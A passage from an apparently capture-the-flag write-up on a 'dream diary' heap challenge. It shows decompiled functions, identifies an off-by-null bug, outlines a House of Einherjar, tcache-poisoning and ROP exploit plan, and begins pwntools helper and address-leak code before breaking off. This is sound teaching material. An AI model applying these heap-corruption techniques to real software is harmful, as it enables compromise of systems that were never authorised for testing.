+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">0x</span><span class="mtk6">1f0</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> size) </span><span class="mtk5">||</span><span class="mtk1"> ((size </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">110</span><span class="mtk1"> </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (</span><span class="mtk5">0x</span><span class="mtk6">f8</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> size)))) {</span>
+<span class="mtk1">          </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"According to research, such a dream length is imp</span><span class="mtk4">ossible :(</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">3c</span><span class="mtk1">, stderr);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">          </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) size;</span>
+<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"data: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">6</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">        p_dream </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">(size);</span>
+<span class="mtk1">        dreams[(ulong)index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> p_dream;</span>
+<span class="mtk1">        </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">], size);</span>
+<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"done</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">5</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">      }</span>
+
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index_copy </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (dreams[(ulong) index_copy </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>  
+<span class="mtk1">      index </span><span class="mtk5">=</span><span class="mtk1"> index_copy;</span>
+<span class="mtk1">      </span><span class="mtk5">goto</span><span class="mtk1"> LAB_001014a3;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    index_copy</span><span class="mtk5">++</span><span class="mtk1">;</span>
+<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1">( </span><span class="mtk6">true</span><span class="mtk1"> );</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>As can be seen, we can use chunks of maximum size <code>0x1f0</code> and we sizes from <code>0xf0</code> to <code>0x108</code> are not allowed.</p><p>There is a global variable called <code>dreams</code> that stores the size entered by the user and the address of the allocated chunk.</p><h3 id="edit-function">Edit function</h3><p>This is <code>edit_dream</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">edit_dream</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> c;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> i;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret_copy;</span>
+
+<span class="mtk1">  </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"index: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">19</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>  
+<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"uafs are for noobs</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">13</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Input data: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">c</span><span class="mtk1">, stderr);</span>
+
+<span class="mtk1">      </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">uint</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong)index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">); i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">        ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">c, </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">        ret_copy </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1">) ret;</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (ret_copy </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">          </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Error with writing to diary!"</span><span class="mtk1">,</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">1c</span><span class="mtk1">, stderr);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">          </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">break</span><span class="mtk1">;</span>
+
+<span class="mtk1">        dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">][i] </span><span class="mtk5">=</span><span class="mtk1"> c;</span>
+<span class="mtk1">      }</span>
+
+<span class="mtk1">      dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">][i] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"invalid index</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>This function checks if the chunk exists or not, so there is no straight-forward Use After Free vulnerability. The modification of the chunk data is almost correct, but we have a flaw here:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">      dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">][i] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>  
+</code></pre></div><p>If we choose the maximum size for the information part of a chunk and use edit, after the <code>for</code> loop, the counter <code>i</code> will be one byte out of bounds. Therefore, the above sentence puts a null byte one byte out of bounds (also known as off-by-null).</p><p>Notice as well that we cannot enter null byte or newline characters here:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> ((c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (c </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">break</span><span class="mtk1">;</span>  
+</code></pre></div><h3 id="free-function">Free function</h3><p>This is <code>delete_dream</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">delete_dream</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">do_delete</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>
+
+<span class="mtk1">  </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"index: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">  </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">index);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">19</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (do_delete </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>
+<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"double frees are not cool</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">1a</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk8">free</span><span class="mtk1">(dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">]);</span>
+<span class="mtk1">        dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk5">*</span><span class="mtk1">(undefined4 </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"diary page deleted</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">13</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>  
+<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"diary doesn</span><span class="mtk6">\'</span><span class="mtk4">t exist here</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">19</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(stderr, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">data: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">]);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"invalid index</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Again, this function looks safe because it checks if the chunk still exists on the global list <code>dreams</code>. Moreover, once a chunk is freed, both the size and the address are removed from the list.</p><h3 id="show-function">Show function</h3><p>This function is combined with <code>delete_dreams</code>. The relevant part is here:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  <span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (</span><span class="mtk5">&amp;</span><span class="mtk1">sizes </span><span class="mtk5">+</span><span class="mtk1"> (ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> (dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">)) {</span>  
+<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"diary doesn</span><span class="mtk6">\'</span><span class="mtk4">t exist here</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">19</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk8">fprintf</span><span class="mtk1">(stderr, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">data: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, dreams[(ulong) index </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">]);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"invalid index</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">, stderr);</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>It simply shows the contents of a given chunk as a string (so, it will stop at a null byte).</p><h2 id="exploit-strategy">Exploit strategy</h2><p>The only bug we have is the off-by-null. This bug can be used to perform a technique known as null byte poisoning. The idea of this technique is to abuse the fact that heap chunks are adjacent to modify the flags of the next chunk. So, flags <code>AMP</code> will be set to <code>000</code> in binary, which indicates that the previous chunk is not in use.</p><p>Then, we can chain this size modification with a fake chunk with malicious <code>fd</code> and <code>bk</code> pointers, free the modified chunk and trigger <code>malloc_consolidate</code>. As a result, we will be performing a kind of Unsafe Unlink exploit, which will provide overlaping chunks and thus we will be able to perform Tcache poisoning to target <code>__free_hook</code>. I think this attack is known as House of Einherjar, but I&rsquo;m not too sure.</p><p>Remember that Glibc is patched and there are <code>seccomp</code> rules, so we will need to use ROP. I found two ways of executing a ROP chain on this heap environment. One is to target magic gadgets existing in Glibc to control a lot of registers and pivot the stack to the heap. The other is to find a stack address leak using <code>environ</code> from Glibc and enter the ROP chain on the stack, modifying the saved return address as usual.</p><p>There are some twists during exploitation and at the end, but they will be covered in the next section.</p><h2 id="exploit-development">Exploit development</h2><p>We will be using these helper functions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">size</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'size: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">size</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'data: '</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">)</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Input data: '</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">)</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">recount</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'4'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.recvuntil(</span><span class="mtk7 mtki">b</span><span class="mtk4">'data: '</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">p</span><span class="mtk1">.recvuntil(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">1. write about dream'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>  
+</code></pre></div><h3 id="leaking-memory-addresses">Leaking memory addresses</h3><p>First of all, we must get some memory leaks to perform the aforementioned techniques. It is quite common in heap exploitation challenges that involve Tcache to fill the Tcache free-list for a chunk with size greater than <code>0x80</code> (to about Fast Bin chunks), so that when another chunk is freed, it is thrown to the Unsorted Bin. As a result, the chunk will have a pointer to <code>main_arena</code> in both <code>fd</code> and <code>bk</code> pointers.</p><p>Although we cannot show the contents directly because there is no Use After Free, we can still allocate a new chunk there and modify only the last byte, leaving the rest of the address untouched and available to be shown.</p><p>Moreover, we can apply the same trick to leak a heap address by modifying a Tcache chunk.</p><p>With the following code, we will have the base address of Glibc and the heap (GDB might be needed to find correct offsets):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">88</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">):</span>
